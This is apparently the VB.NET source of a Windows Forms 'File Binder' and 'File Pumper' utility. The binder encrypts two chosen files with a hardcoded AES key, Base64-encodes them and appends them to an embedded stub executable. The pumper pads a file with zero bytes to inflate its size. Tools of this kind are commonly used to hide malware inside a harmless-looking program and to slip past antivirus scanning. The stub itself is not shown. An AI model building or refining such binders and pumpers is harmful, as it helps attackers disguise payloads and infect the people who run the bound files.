Public Class Form1


    Private draggable As Boolean
    Private mouseY As Integer
    Private mouseX As Integer


    '//////////////////////////////// File Binder ////////////////////////////////'
    Dim F, F2 As String
    Function Secure(ByVal data As Byte()) As Byte()
        Using SA As New System.Security.Cryptography.RijndaelManaged
            SA.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
            SA.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
            Return SA.CreateEncryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function
    Function UnSecure(ByVal data As Byte()) As Byte()
        Using SA As New System.Security.Cryptography.RijndaelManaged
            SA.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
            SA.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
            Return SA.CreateDecryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function
    Private Sub btn_File1_Click(sender As Object, e As EventArgs) Handles btn_File1.Click
        Dim ofd As New OpenFileDialog
        With ofd
            .FileName = "*.*"
            .Title = "Choose a File..."
            .Filter = "All Files (*.*)|*.*"
            .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                F = .SafeFileName
                TextBox1.Text = .FileName
            End If
        End With
    End Sub
    Private Sub btn_File2_Click(sender As Object, e As EventArgs) Handles btn_File2.Click
        Dim ofd As New OpenFileDialog
        With ofd
            .FileName = "*.*"
            .Title = "Choose a File..."
            .Filter = "All Files (*.*)|*.*"
            .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                F2 = .SafeFileName
                TextBox2.Text = .FileName
            End If
        End With
    End Sub

    Private Sub Close_app_Click(sender As Object, e As EventArgs) Handles Close_app.Click
        Close()
    End Sub

    Private Sub btn_Bind_Click(sender As Object, e As EventArgs) Handles btn_Bind.Click
        Try
            Dim sfd As New SaveFileDialog
            With sfd
                .FileName = ""
                .Title = "Choose an output folder..."
                .Filter = "All Files (*.*)|*.*"
                .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                If .ShowDialog = Windows.Forms.DialogResult.OK Then
                    Dim sp As String = "[SPLITTER]"
                    Dim buffer As Byte() = My.Resources.stub
                    My.Computer.FileSystem.WriteAllBytes(.FileName, buffer, False)
                    Dim file1 As Byte() = Secure(My.Computer.FileSystem.ReadAllBytes(TextBox1.Text))
                    Dim file2 As Byte() = Secure(My.Computer.FileSystem.ReadAllBytes(TextBox2.Text))

                    System.IO.File.AppendAllText(.FileName, sp & Convert.ToBase64String(file1) & sp & F & sp & Convert.ToBase64String(file2) & sp & F2)
                    MsgBox("Binded Successfully!", MsgBoxStyle.Information + MsgBoxStyle.OkOnly, "Success")
                End If
            End With
        Catch ex As Exception
            MsgBox("Error(s) occured" & ex.Message, MsgBoxStyle.Critical, "Error")
        End Try
    End Sub

    '//////////////////////////////// File Pumper ////////////////////////////////'

    Private Sub btnBrowse_Click(sender As Object, e As EventArgs) Handles btnBrowse.Click
        Dim ofd As New OpenFileDialog
        ofd.Filter = "All Files (*.*)|*.*"
        ofd.ShowDialog()
        txtFileName.Text = ofd.FileName
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        rbtnKilobyte.Checked = True
    End Sub

    Private Sub btnPump_Click(sender As Object, e As EventArgs) Handles btnPump.Click
        Try
            Dim sfd As New SaveFileDialog
            sfd.Filter = "All Files (*.*)|*.*"
            sfd.ShowDialog()
            Dim filesize As Double = Val(NumericUpDown1.Value)
            IO.File.Copy(txtFileName.Text, sfd.FileName)
            If rbtnKilobyte.Checked Then
                filesize = filesize * 1024
            End If
            If rbtnMegabyte.Checked Then
                filesize = filesize * 1048576
            End If
            Dim filetopump = IO.File.OpenWrite(sfd.FileName)
            Dim size = filetopump.Seek(0, IO.SeekOrigin.End)
            While size < filesize
                filetopump.WriteByte(0)
                size += 1
            End While
            filetopump.Close()
            MsgBox("Pumped Successfully!")
        Catch ex As Exception
            MsgBox("Error(s) occured" & ex.Message, MsgBoxStyle.Critical, "Error")
        End Try
    End Sub

    Private Sub Panel1_MouseDown(sender As Object, e As MouseEventArgs) Handles Panel1.MouseDown
        draggable = True
        mouseX = Cursor.Position.X - Me.Left
        mouseY = Cursor.Position.Y - Me.Top
    End Sub

    Private Sub Panel1_MouseMove(sender As Object, e As MouseEventArgs) Handles Panel1.MouseMove
        If draggable Then
            Me.Top = Cursor.Position.Y - mouseY
            Me.Left = Cursor.Position.X - mouseX
        End If
    End Sub

    Private Sub Panel1_MouseUp(sender As Object, e As MouseEventArgs) Handles Panel1.MouseUp
        draggable = False
    End Sub

    Private Sub Label1_MouseDown(sender As Object, e As MouseEventArgs) Handles Label1.MouseDown
        draggable = True
        mouseX = Cursor.Position.X - Me.Left
        mouseY = Cursor.Position.Y - Me.Top
    End Sub

    Private Sub Label1_MouseMove(sender As Object, e As MouseEventArgs) Handles Label1.MouseMove
        If draggable Then
            Me.Top = Cursor.Position.Y - mouseY
            Me.Left = Cursor.Position.X - mouseX
        End If
    End Sub

    Private Sub Label1_MouseUp(sender As Object, e As MouseEventArgs) Handles Label1.MouseUp
        draggable = False
    End Sub

    Private Sub PictureBox1_MouseDown(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseDown
        draggable = True
        mouseX = Cursor.Position.X - Me.Left
        mouseY = Cursor.Position.Y - Me.Top
    End Sub

    Private Sub PictureBox1_MouseMove(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseMove
        If draggable Then
            Me.Top = Cursor.Position.Y - mouseY
            Me.Left = Cursor.Position.X - mouseX
        End If
    End Sub

    Private Sub PictureBox1_MouseUp(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseUp
        draggable = False
    End Sub
End Class
